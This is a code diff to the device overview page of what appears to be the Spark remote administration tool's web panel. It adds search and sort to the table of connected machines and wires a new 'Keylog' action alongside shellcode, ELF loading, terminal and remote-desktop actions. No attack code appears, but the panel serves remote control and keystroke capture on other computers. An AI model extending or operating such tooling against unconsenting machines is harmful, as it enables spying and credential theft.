@@ -5,6 +5,10 @@ import { catchBlobReq, formatSize, request, tsToTime, waitTime, renderUnixEpochT
 import {QuestionCircleOutlined} from "@ant-design/icons";
 import i18n from "../locale/locale";
 
+import { SearchOutlined } from '@ant-design/icons';
+import { Input, Space, Table } from 'antd';
+import Highlighter from 'react-highlight-words';
+
 // DO NOT EDIT OR DELETE THIS COPYRIGHT MESSAGE.
 console.log("%c By XZB %c https://github.com/XZB-1248/Spark", 'font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;font-size:64px;color:#00bbee;-webkit-text-fill-color:#00bbee;-webkit-text-stroke:1px#00bbee;', 'font-size:12px;');
 
@@ -18,9 +22,12 @@ let ComponentMap = {
 	Shellcode: null,
 	Executable: null,
 	Loadelf: null,
+	Keylog: null,
 };
 
 function overview(props) {
+	const [searchText, setSearchText] = useState('');
+	const [searchedColumn, setSearchedColumn] = useState('');
 	const [loading, setLoading] = useState(false);
 	const [execute, setExecute] = useState(false);
 	const [shellcode, setShellcode] = useState(false);
@@ -31,77 +38,18 @@ function overview(props) {
 	const [explorer, setExplorer] = useState(false);
 	const [generate, setGenerate] = useState(false);
 	const [terminal, setTerminal] = useState(false);
+	const [keylog, setKeylog] = useState(false);
 	const [screenBlob, setScreenBlob] = useState('');
 	const [dataSource, setDataSource] = useState([]);
 
-	const columns = [
-		{
-			key: 'hostname',
-			title: i18n.t('OVERVIEW.HOSTNAME'),
-			dataIndex: 'hostname',
-			ellipsis: true,
-			width: 100
-		},
-		{
-			key: 'username',
-			title: i18n.t('OVERVIEW.USERNAME'),
-			dataIndex: 'username',
-			ellipsis: true,
-			width: 90
-		},
-		{
-			key: 'os',
-			title: i18n.t('OVERVIEW.OS'),
-			dataIndex: 'os',
-			ellipsis: true,
-			width: 80
-		},
-		{
-			key: 'lan',
-			title: 'LAN',
-			dataIndex: 'lan',
-			ellipsis: true,
-			width: 100
-		},
-		{
-			key: 'wan',
-			title: 'WAN',
-			dataIndex: 'wan',
-			ellipsis: true,
-			width: 100
-		},
-		{
-			key: 'clientuptime',
-			title: 'Client Uptime',
-			dataIndex: 'clientuptime',
-			ellipsis: true,
-			renderText: renderUnixEpochToHumanReadable,
-			width: 50
-		},
-		{
-			key: 'uptime',
-			title: i18n.t('OVERVIEW.UPTIME'),
-			dataIndex: 'uptime',
-			ellipsis: true,
-			renderText: tsToTime,
-			width: 50
-		},
-		{
-			key: 'option',
-			title: i18n.t('OVERVIEW.OPERATIONS'),
-			dataIndex: 'id',
-			valueType: 'option',
-			ellipsis: false,
-			render: (_, device) => renderOperation(device),
-			width: 170
-		},
-	];
+
 	const options = {
 		show: true,
 		density: true,
 		setting: true,
 	};
 	const tableRef = useRef();
+	const searchInput = useRef(null);
 	const loadComponent = (component, callback) => {
 		let element = null;
 		component = component.toLowerCase();
@@ -120,7 +68,193 @@ function overview(props) {
 			callback();
 		}
 	}
+	const handleSearch = (selectedKeys, confirm, dataIndex) => {
+		confirm();
+		setSearchText(selectedKeys[0]);
+		setSearchedColumn(dataIndex);
+	};
+	const handleReset = (clearFilters, confirm) => {
+		clearFilters();
+		setSearchText('');
+		confirm();
+		setSearchedColumn();
+	};
+	const getColumnSearchProps = dataIndex => ({
+		filterDropdown: ({ setSelectedKeys, selectedKeys, confirm, clearFilters, close }) => (
+			<div style={{ padding: 8 }} onKeyDown={e => e.stopPropagation()}>
+				<Input
+					ref={searchInput}
+					placeholder={`Search ${dataIndex}`}
+					value={selectedKeys[0]}
+					onChange={e => setSelectedKeys(e.target.value ? [e.target.value] : [])}
+					onPressEnter={() => handleSearch(selectedKeys, confirm, dataIndex)}
+					style={{ marginBottom: 8, display: 'block' }}
+				/>
+				<Space>
+					<Button
+						type="primary"
+						onClick={() => handleSearch(selectedKeys, confirm, dataIndex)}
+						icon={<SearchOutlined />}
+						size="small"
+						style={{ width: 90 }}
+					>
+						Search
+					</Button>
+					<Button
+						onClick={() => clearFilters && handleReset(clearFilters, confirm)}
+						size="small"
+						style={{ width: 90 }}
+					>
+						Reset
+					</Button>
+					<Button
+						type="link"
+						size="small"
+						onClick={() => {
+							confirm({ closeDropdown: false });
+							setSearchText(selectedKeys[0]);
+							setSearchedColumn(dataIndex);
+						}}
+					>
+						Filter
+					</Button>
 
+				</Space>
+			</div>
+		),
+		filterIcon: filtered => <SearchOutlined style={{ color: filtered ? '#1677ff' : undefined }} />,
+		onFilter: (value, record) =>
+			record[dataIndex].toString().toLowerCase().includes(value.toLowerCase()),
+		filterDropdownProps: {
+			onOpenChange(open) {
+				if (open) {
+					setTimeout(() => {
+						var _a;
+						return (_a = searchInput.current) === null || _a === void 0 ? void 0 : _a.select();
+					}, 100);
+				}
+			},
+		},
+		render: text =>
+			searchedColumn === dataIndex ? (
+				<Highlighter
+					highlightStyle={{ backgroundColor: '#ffc069', padding: 0 }}
+					searchWords={[searchText]}
+					autoEscape
+					textToHighlight={text ? text.toString() : ''}
+				/>
+			) : (
+				text
+			),
+	});
+
+	const columns = [
+		Object.assign(
+			Object.assign(
+				{ title: i18n.t('OVERVIEW.HOSTNAME'), dataIndex: 'hostname', key: 'hostname', width: 100 },
+				getColumnSearchProps('hostname')
+			),
+			{
+				sorter: (a, b) => a.hostname.localeCompare(b.hostname),
+				sortDirections: ['descend', 'ascend'],
+			},
+		),
+		Object.assign(
+			Object.assign(
+				{ title: i18n.t('OVERVIEW.USERNAME'), dataIndex: 'username', key: 'username', width: 90 },
+				getColumnSearchProps('username')
+			),
+			{
+				sorter: (a, b) => a.username.localeCompare(b.username),
+				sortDirections: ['descend', 'ascend'],
+			},
+		),
+		Object.assign(
+			Object.assign(
+				{ title: i18n.t('OVERVIEW.OS'), dataIndex: 'os', key: 'os', width: 90 },
+				getColumnSearchProps('os')
+			),
+			{
+				sorter: (a, b) => a.os.localeCompare(b.os),
+				sortDirections: ['descend', 'ascend'],
+			},
+		),
+		Object.assign(
+			Object.assign(
+				{ title: 'LAN', dataIndex: 'lan', key: 'lan', width: 90 },
+				getColumnSearchProps('lan')
+			),
+			{
+				sorter: (a, b) => {
+					const normalize = ip => {
+						if (!ip) return '';
+						if (ip.includes('.')) {
+							return ip.split('.').reduce((acc, octet) => (acc << 8) + parseInt(octet, 10), 0);
+						}
+						return ip
+							.split(':')
+							.map(part => part.padStart(4, '0'))
+							.join(':');
+					};
+					const ipA = normalize(a.lan);
+					const ipB = normalize(b.lan);
+					if (ipA < ipB) return -1;
+					if (ipA > ipB) return 1;
+					return 0;
+				},
+				sortDirections: ['descend', 'ascend'],
+			},
+		),
+		Object.assign(
+			Object.assign(
+				{ title: 'WAN', dataIndex: 'wan', key: 'wan', width: 90 },
+				getColumnSearchProps('wan')
+			),
+			{
+				sorter: (a, b) => {
+					const normalize = ip => {
+						if (!ip) return '';
+						if (ip.includes('.')) {
+							return ip.split('.').reduce((acc, octet) => (acc << 8) + parseInt(octet, 10), 0);
+						}
+						return ip
+							.split(':')
+							.map(part => part.padStart(4, '0'))
+							.join(':');
+					};
+					const ipA = normalize(a.wan);
+					const ipB = normalize(b.wan);
+					if (ipA < ipB) return -1;
+					if (ipA > ipB) return 1;
+					return 0;
+				},
+				sortDirections: ['descend', 'ascend'],
+			},
+		),
+		Object.assign(
+			Object.assign(
+				{ title: 'Client', dataIndex: 'clientuptime', key: 'clientuptime', width: 90, renderText: renderUnixEpochToHumanReadable }
+			),
+			{
+				sorter: (a, b) => a.clientuptime.toString().localeCompare(b.clientuptime.toString()),
+				sortDirections: ['descend', 'ascend'],
+			},
+		),
+		Object.assign(
+			Object.assign(
+				{ title: i18n.t('OVERVIEW.UPTIME'), dataIndex: 'uptime', key: 'uptime', width: 90, renderText: tsToTime }
+			)
+		),
+		{
+			key: 'option',
+			title: i18n.t('OVERVIEW.OPERATIONS'),
+			dataIndex: 'id',
+			valueType: 'option',
+			ellipsis: false,
+			render: (_, device) => renderOperation(device),
+			width: 170
+		},
+	];
 	useEffect(() => {
 		// auto update is only available when all modal are closed.
 		if (!execute && !shellcode && !desktop && !procMgr && !explorer && !generate && !terminal) {
@@ -139,6 +273,7 @@ function overview(props) {
 			{key: 'loadelf', name: "Load ELF"},
 			{key: 'shellcode', name: i18n.t('OVERVIEW.SHELLCODE')},
 			{key: 'desktop', name: i18n.t('OVERVIEW.DESKTOP')},
+			{key: 'keylog', name: "Keylog"},
 			{key: 'screenshot', name: i18n.t('OVERVIEW.SCREENSHOT')},
 			{key: 'restart', name: i18n.t('OVERVIEW.RESTART')},
 			{key: 'shutdown', name: i18n.t('OVERVIEW.SHUTDOWN')},
@@ -161,6 +296,7 @@ function overview(props) {
 		const device = value;
 		let hooksMap = {
 			terminal: setTerminal,
+			keylog: setKeylog,
 			explorer: setExplorer,
 			generate: setGenerate,
 			procmgr: setProcMgr,
@@ -345,6 +481,14 @@ function overview(props) {
 				/>
 			}
 			{
+				ComponentMap.Keylog &&
+				<ComponentMap.Keylog
+					open={keylog}
+					device={keylog}
+					onCancel={setKeylog.bind(null, false)}
+				/>
+			}
+			{
 				ComponentMap.Shellcode &&
 				<ComponentMap.Shellcode
 					open={shellcode}
@@ -356,6 +500,17 @@ function overview(props) {
 				scroll={{
 					x: 'max-content',
 					scrollToFirstRowOnChange: true
+				}}
+				onChange={(pagination, filters, sorter) => {
+					if (sorter.field === 'lan' && sorter.order) {
+						setDataSource(prevData =>
+							[...prevData].sort((a, b) =>
+								sorter.order === 'ascend'
+									? a.lan.localeCompare(b.lan)
+									: b.lan.localeCompare(a.lan)
+							)
+						);
+					}
 				}}
 				rowKey='id'
 				search={false}
@@ -376,6 +531,7 @@ function overview(props) {
 			/>
 		</>
 	);
+
 }
 function UsageBar(props) {
 	let {usage} = props;
